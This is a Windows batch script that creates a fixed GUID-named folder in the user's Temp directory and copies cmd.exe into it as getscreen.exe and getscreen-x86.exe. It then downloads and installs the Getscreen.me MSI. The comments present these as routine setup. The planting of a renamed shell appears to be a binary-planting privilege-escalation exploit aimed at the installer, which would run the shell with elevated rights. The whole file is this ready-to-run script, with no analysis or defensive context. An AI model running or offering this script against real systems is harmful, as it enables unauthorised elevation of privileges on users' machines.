@echo off
REM Get the username of the logged-in user
set "username=%USERNAME%"
echo Username detected: %username%

REM Define the Temp directory based on the username
set "tempDir=C:\Users\%username%\AppData\Local\Temp\934bac36-46b1-45d1-abd0-2b8ef958508e"

REM Create the Temp directory
if not exist "%tempDir%" (
    mkdir "%tempDir%"
    echo Temp directory created: %tempDir%
) else (
    echo Temp directory already exists: %tempDir%
)

REM Delete old files if they exist
if exist "%tempDir%\getscreen.exe" (
    del "%tempDir%\getscreen.exe"
    echo Deleted old getscreen.exe
) else (
    echo No old getscreen.exe found
)

if exist "%tempDir%\getscreen-x86.exe" (
    del "%tempDir%\getscreen-x86.exe"
    echo Deleted old getscreen-x86.exe
) else (
    echo No old getscreen-x86.exe found
)

REM Copy cmd.exe to the Temp directory
copy "C:\Windows\System32\cmd.exe" "%tempDir%\getscreen.exe"
if %ERRORLEVEL% equ 0 (
    echo Copied cmd.exe to %tempDir%\getscreen.exe
) else (
    echo Failed to copy cmd.exe to %tempDir%\getscreen.exe
)

copy "C:\Windows\System32\cmd.exe" "%tempDir%\getscreen-x86.exe"
if %ERRORLEVEL% equ 0 (
    echo Copied cmd.exe to %tempDir%\getscreen-x86.exe
) else (
    echo Failed to copy cmd.exe to %tempDir%\getscreen-x86.exe
)

REM Download getscreen.msi to the user's Downloads folder
set "downloadsDir=C:\Users\%username%\Downloads"
curl https://getscreen.me/download/getscreen.msi -o "%downloadsDir%\getscreen.msi"
if %ERRORLEVEL% equ 0 (
    echo Downloaded getscreen.msi to %downloadsDir%
) else (
    echo Failed to download getscreen.msi
)

REM Install getscreen.msi from the Downloads folder
msiexec /i "%downloadsDir%\getscreen.msi"
if %ERRORLEVEL% equ 0 (
    echo Installed getscreen.msi successfully
) else (
    echo Failed to install getscreen.msi
)
